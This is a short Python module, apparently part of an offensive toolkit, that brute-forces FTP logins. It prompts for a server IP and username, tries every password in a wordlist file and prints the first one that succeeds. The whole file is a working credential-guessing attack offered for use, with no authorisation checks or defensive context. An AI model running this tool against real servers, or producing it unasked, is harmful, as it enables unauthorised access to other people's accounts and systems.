import ftplib
from utils.colors import color_text

def run():
    print(color_text("\n[+] Starting FTP Brute Force...\n", "cyan"))
    
    host = input("Enter FTP server IP address: ")
    username = input("Enter username to test: ")
    
    try:
        with open("wordlist.txt", "r") as f:
            for line in f:
                password = line.strip()
                try:
                    ftp = ftplib.FTP(host, timeout=5)
                    ftp.login(user=username, passwd=password)
                    print(color_text(f"[SUCCESS] Password found: {password}", "green"))
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    print(color_text(f"[-] Failed login: {password}", "red"))
                except Exception as e:
                    print(color_text(f"[!] Error: {e}", "red"))
                    break
    except FileNotFoundError:
        print(color_text("[-] wordlist.txt not found!", "red"))

